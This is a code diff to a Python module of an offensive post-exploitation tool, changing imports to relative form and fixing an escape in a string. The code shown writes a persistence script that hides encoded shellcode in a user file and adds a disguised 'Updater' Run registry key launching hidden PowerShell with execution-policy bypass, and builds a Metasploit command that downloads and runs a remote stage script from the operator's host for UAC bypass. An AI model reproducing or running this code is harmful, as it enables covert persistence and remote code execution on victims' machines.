@@ -1,5 +1,5 @@
 from base64 import b64encode
-from main import powershellShellcodeLayout, randomUnusedPort, DoServe, \
+from .main import powershellShellcodeLayout, randomUnusedPort, DoServe, \
                  stagePowershellCode
 import multiprocessing
 
@@ -15,7 +15,7 @@ class EXTRAS(object):
 
     def PERSISTENCE(self):
         with open('persist.ps1', 'w') as persistfile:
-            persistfile.write("echo \"%s\" | out-file $env:USERPROFILE/update.txt;New-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Updater -PropertyType String -Value 'C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -c \"powershell -exec bypass -NonInteractive -WindowStyle Hidden -enc (Get-Content $env:USERPROFILE\update.txt)\"'" % b64encode(self.injectshellcode_sleep.encode('utf_16_le')))
+            persistfile.write("echo \"%s\" | out-file $env:USERPROFILE/update.txt;New-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Updater -PropertyType String -Value 'C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -c \"powershell -exec bypass -NonInteractive -WindowStyle Hidden -enc (Get-Content $env:USERPROFILE\\update.txt)\"'" % b64encode(self.injectshellcode_sleep.encode('utf_16_le')))
             persistfile.close()
         with open('persist.rc', 'w') as persistfilerc:
             persistfilerc.write("""run post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1""")
@@ -23,7 +23,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def UACBYPASS(self, version):
-        from menu import returnIP
+        from .menu import returnIP
         randomPort = randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1""" % (returnIP(), randomPort)
         moduleport = randomUnusedPort()
@@ -44,7 +44,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def ALLCHECKS(self):
-        from menu import returnIP
+        from .menu import returnIP
         moduleport = randomUnusedPort()
         DoServe(returnIP(), "", "./externalmodules", port=moduleport, printIt=False)
         with open('allchecks.ps1', 'w') as allchecksfile:
